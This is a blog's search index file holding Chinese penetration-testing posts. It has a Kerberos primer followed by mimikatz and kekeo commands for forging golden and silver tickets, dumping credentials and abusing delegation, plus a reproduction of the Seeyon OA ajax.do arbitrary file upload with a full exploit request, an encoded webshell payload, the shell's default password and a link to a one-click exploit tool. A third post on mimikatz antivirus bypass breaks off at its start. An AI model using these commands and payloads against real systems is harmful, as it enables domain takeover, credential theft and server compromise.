<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>kerberos浅析认证及攻击方法</title>
      <link href="2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
      <url>2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><strong>不要为自己的失败找理由</strong></p><h1 id="Kerberos认证浅析"><a href="#Kerberos认证浅析" class="headerlink" title="Kerberos认证浅析"></a>Kerberos认证浅析</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在Kerberos协议中主要又三个角色的存在：</p><p>1.访问服务的Client</p><p>2.提供服务的Server</p><p>3.KDC(Key Distribution Center)密钥分发中心<br>其中KDC分为Authentication Service(简称AS)，AS为Client生成TGT、Ticket Granting Service(简称TGS)，TGS为Client生成Ticket</p><p>AD类似于本机SAM的一个数据库，存储着Client的白名单，只有在这个名单中的Client才能够申请到TGT</p><p>TGT：可以理解为入场卷，通过入场卷可以获得票据</p><p>Tickket：票据，在域中使用</p><p>KDC服务默认安装域控中，从物理层面看，AD与KDC均为域控制器</p><p>KDC服务框架中包含一个krbtgt账户，是在创建域时系统自动创建的</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>这个流程可以理解为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有一个富豪在他的别野弄了一场宴会，邀请了Client并发送了邀请函(宴会主人不知道Client长啥样)，并且宴会由主人亲自主持。那么Client要进入宴会找到富豪得到想要的东西，有下面几道程序：</span><br><span class="line">1.邀请函 --&gt; 白名单</span><br><span class="line">2.Client来到别野大门被保安(AS)拦住Client并询问他是否有邀请函(白名单)，Client亮出邀请函，保安立马拿富豪为Client准备的礼物(TGT)给他，这下Client让司机继续驶向富豪的别野</span><br><span class="line">3.富豪的管家(TGS)早早的在别野门口等候，当管家(TGS)看到Client手上拿着礼物(TGT)，即可上来进行问好并把别野的通行卡(Ticket)给了Clent</span><br><span class="line">4.拿到了通行卡(Ticket)的Client就可以在别野中畅通无阻并找到了富豪(Server)，得到了他想要的东西</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/1.png"></p><h1 id="Kerberos攻击方法"><a href="#Kerberos攻击方法" class="headerlink" title="Kerberos攻击方法"></a>Kerberos攻击方法</h1><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug，提升权限</span><br><span class="line">sekurlsa::logonpasswords，抓取密码</span><br><span class="line">kerberos::list，查看有没有票据，假如有需要进行清除</span><br><span class="line">kerberos::purge，清除票据</span><br><span class="line">kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt</span><br><span class="line">&#x2F;sid:SID值</span><br><span class="line">&#x2F;target:目标服务器主机名</span><br><span class="line">&#x2F;service：需要指定相关的服务名，此处为cifs</span><br><span class="line">&#x2F;rc4：域控的计算机账号ntlm hash</span><br><span class="line">&#x2F;user:要伪造的用户名，任意填写</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/4.png"></p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:域名 &#x2F;user:krbtgt</span><br><span class="line">#构造方法</span><br><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:域名 &#x2F;sid:域sid &#x2F;rc4:krbtgt ntlm hash &#x2F;user:任意用户名 &#x2F;ptt&quot; exit</span><br><span class="line">sid不要复制后面的502</span><br><span class="line">#测试是否成功</span><br><span class="line">dir \\server2008.hello.com</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/2.png"></p><p>可以使用PsExec进行执行命令</p><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/3.png"></p><p>工具下载地址</p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><h2 id="金票与银票区别"><a href="#金票与银票区别" class="headerlink" title="金票与银票区别"></a>金票与银票区别</h2><h3 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h3><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p><h3 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h3><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p><h3 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h3><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="设置非约束委派"><a href="#设置非约束委派" class="headerlink" title="设置非约束委派"></a>设置非约束委派</h3><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/5.png"></p><p>设置完之后，要用administrator账户登录W2008，这里使用WinRM进行远程连接，默认端口为5985</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName W2008</span><br></pre></td></tr></table></figure><p>常见的连接方式还有：MSSQL和IIS</p><p>假如出现此错误</p><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/7.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#域控运行，添加trusthost列表</span><br><span class="line">Set-item wsman:localhost\client\trustedhosts –value *</span><br><span class="line">#域主机运行</span><br><span class="line">Enable-PSremoting -force</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/8.png"></p><h3 id="非约束委派查找"><a href="#非约束委派查找" class="headerlink" title="非约束委派查找"></a>非约束委派查找</h3><h4 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h4><p>工具地址：<a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC&#x3D;hello,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/6.png"></p><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>工具地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained -Domain hello.com</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/9.png"></p><h4 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#kali自带</span><br><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.213.148:389 -D &quot;CN&#x3D;hello,CN&#x3D;Users,DC&#x3D;hello,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;hello,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure><h3 id="非约束委派利用"><a href="#非约束委派利用" class="headerlink" title="非约束委派利用"></a>非约束委派利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/10.png"></p><p>通过ptt将TGT注入到当前会话中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;76b92]-2-0-40e00000-Administrator@krbtgt-HELLO.COM.kirbi</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/11.png"></p><h3 id="打印机Bug"><a href="#打印机Bug" class="headerlink" title="打印机Bug"></a>打印机Bug</h3><p>这个我懒得折腾了，08的.NET版本对不上</p><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="设置约束委派"><a href="#设置约束委派" class="headerlink" title="设置约束委派"></a>设置约束委派</h3><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/12.png"></p><h3 id="约束委派查找"><a href="#约束委派查找" class="headerlink" title="约束委派查找"></a>约束委派查找</h3><h4 id="ADfind-1"><a href="#ADfind-1" class="headerlink" title="ADfind"></a>ADfind</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=hello,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/13.png"></p><h4 id="PowerView-1"><a href="#PowerView-1" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Domain hello.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure><h3 id="约束委派利用"><a href="#约束委派利用" class="headerlink" title="约束委派利用"></a>约束委派利用</h3><p>利用条件：指定服务用户明文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:DM &#x2F;domain:hello.com &#x2F;password:abcd0123** &#x2F;ticket:test.kirb</span><br></pre></td></tr></table></figure><p>获得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TGT_DM@HELLO.COM_krbtgt~hello.com@HELLO.COM.kirbi</span><br><span class="line">#将其改名为2.kirbi</span><br><span class="line">#使用这张TGT通过伪造s4u请求以administrator用户身份请求访问AD CIFS的ST</span><br><span class="line">tgs::s4u &#x2F;tgt:2.kirbi &#x2F;user:Administrator@hello.com &#x2F;service:cifs&#x2F;AD.hello.com</span><br><span class="line">#使用mimikatz将ST2导入当前会话</span><br><span class="line">kerberos::ptt TGS_Administrator@hello.com@HELLO.COM_cifs~AD.hello.com@HELLO.COM.kirbi</span><br><span class="line">#导入之后即可访问AD的cifs服务，kekeo同样支持使用NTLM Hash</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></p><p><a href="https://xz.aliyun.com/t/7217">https://xz.aliyun.com/t/7217</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA-ajax.do任意文件上传漏洞</title>
      <link href="2021/01/22/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/22/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>转自<a href="https://www.dmkxy.me/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://www.dmkxy.me/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a></p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p><h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>访问thirdpartyController.do.css/..;/ajax.do，判断是否存在漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;seeyon&#x2F;thirdpartyController.do.css&#x2F;..;&#x2F;ajax.do</span><br></pre></td></tr></table></figure><p>出现异常：java.lang.NullPointerException:null<br><img src="https://www.dmkxy.me/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="图片"><br>使用工具生成payload，我使用的PoC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: JSESSIONID&#x3D;7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL&#x3D;; login_locale&#x3D;zh_CN;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure><p>使用burpsuite上传EXP，漏洞利用成功<br><img src="https://www.dmkxy.me/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png" alt="图片"><br>利用失败会返回如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;message&quot;:&quot;被迫下线，原因：与服务器失去连接&quot;,</span><br><span class="line">&quot;code&quot;:&quot;-1&quot;,</span><br><span class="line">&quot;details&quot;:null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求webshell,证明上传成功<br><img src="https://www.dmkxy.me/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png" alt="图片"><br>使用冰蝎3进行连接，连接成功<br>Webshell地址:<a href="http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx">http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx</a><br>冰蝎3 默认马pass：rebeyond<br><img src="https://www.dmkxy.me/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png" alt="图片"><br><img src="https://www.dmkxy.me/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png" alt="图片"></p><p>冰蝎下载链接：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>①联系致远OA官方以获取最新相关补丁，升级至最新版本。<br>②限制访问seeyon/thirdpartyController.do.css/..;/ajax.do</p><hr><h1 id="一键利用工具"><a href="#一键利用工具" class="headerlink" title="一键利用工具"></a>一键利用工具</h1><p><a href="https://github.com/0-Xyao/Zero-box/tree/main/Seeyon_getshell">https://github.com/0-Xyao/Zero-box/tree/main/Seeyon_getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mimikatz Bypass AV</title>
      <link href="2021/01/20/Mimikatz-Bypass-AV/"/>
      <url>2021/01/20/Mimikatz-Bypass-AV/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容">  <script id="hbeData" type="hbeData" 